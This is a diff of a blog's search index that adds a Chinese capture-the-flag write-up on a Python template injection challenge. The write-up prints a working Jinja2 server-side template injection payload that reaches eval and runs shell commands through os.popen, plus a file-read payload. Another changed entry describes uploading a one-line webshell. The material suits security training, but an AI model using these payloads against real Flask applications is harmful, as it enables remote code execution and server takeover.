@@ -1,6 +1,34 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>攻防世界 WEB Web_python_template_injection</title>
+    <url>/post/57753.html</url>
+    <content><![CDATA[<h1 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h1><p><img src="http://markdown.yeek.top/20200118132746.png" alt=""></p>
+<h1 id="0x01-解题过程"><a href="#0x01-解题过程" class="headerlink" title="0x01 - 解题过程"></a>0x01 - 解题过程</h1><p>打开是单一网页，注释中也没有其他提示。</p>
+<p><img src="http://markdown.yeek.top/20200118132924.png" alt=""></p>
+<p>通过百度得知，是要利用 flask 模板的代码注入漏洞。就例如下面这种</p>
+<p><img src="http://markdown.yeek.top/20200118133342.png" alt=""></p>
+<p>这是某大神已经写好的远程执行漏洞，在popen里填入指令就行了。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% <span class="keyword">if</span> b.<span class="keyword">__class__</span> == &#123;&#125;.<span class="keyword">__class__</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endfor</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>效果如下</p>
+<p><img src="http://markdown.yeek.top/20200118133907.png" alt=""></p>
+<p><img src="http://markdown.yeek.top/20200118133951.png" alt=""></p>
+<h1 id="0x02-技术总结"><a href="#0x02-技术总结" class="headerlink" title="0x02 - 技术总结"></a>0x02 - 技术总结</h1><p>这道题属于 <strong>SSTI——服务端模板注入攻击</strong> ，其实在 <code>Chrome</code> 的 <code>Hackbar</code> 中有测试载荷。</p>
+<p><strong>SSTI</strong> 读取文载荷</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">'fl4g'</span>).read()</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>信息安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>优雅的科学上网</title>
     <url>/post/23204.html</url>
     <content><![CDATA[<p>通过自定义 PAC 规则和 <a href="https://proxy-switchyomega.com/" target="_blank" rel="noopener">SwitchyOmega</a> 插件，优雅的科学上网。当然首先你得自己找到科学上网的方法，然后才能讨论如何优雅。</p>
@@ -44,10 +72,10 @@
   <entry>
     <title>攻防世界 WEB upload1</title>
     <url>/post/17040.html</url>
-    <content><![CDATA[<h1 id="0x01-题目描述"><a href="#0x01-题目描述" class="headerlink" title="0x01 - 题目描述"></a>0x01 - 题目描述</h1><p><img src="http://markdown.yeek.top/20200117152226.png" alt=""></p>
+    <content><![CDATA[<h1 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h1><p><img src="http://markdown.yeek.top/20200117152226.png" alt=""></p>
 <a id="more"></a>
 
-<h1 id="0x02-解题过程"><a href="#0x02-解题过程" class="headerlink" title="0x02 - 解题过程"></a>0x02 - 解题过程</h1><p>打开页面，只有一个上传模块</p>
+<h1 id="0x01-解题过程"><a href="#0x01-解题过程" class="headerlink" title="0x01 - 解题过程"></a>0x01 - 解题过程</h1><p>打开页面，只有一个上传模块</p>
 <p><img src="http://markdown.yeek.top/20200117152444.png" alt=""></p>
 <p>既然题目是 <strong>uplaod1</strong> 那就可以试一下上传一句话木马。</p>
 <p><img src="http://markdown.yeek.top/20200117161249.png" alt=""></p>
@@ -67,7 +95,7 @@
 <p><img src="http://markdown.yeek.top/20200117161357.png" alt=""></p>
 <p>一般不是在服务器的根目录就是在网站的根目录，这道题是后者</p>
 <p><img src="http://markdown.yeek.top/20200117161513.png" alt=""></p>
-<h1 id="0x03-技术总结"><a href="#0x03-技术总结" class="headerlink" title="0x03 - 技术总结"></a>0x03 - 技术总结</h1><ul>
+<h1 id="0x02-技术总结"><a href="#0x02-技术总结" class="headerlink" title="0x02 - 技术总结"></a>0x02 - 技术总结</h1><ul>
 <li>注意看网页的源码</li>
 </ul>
 ]]></content>
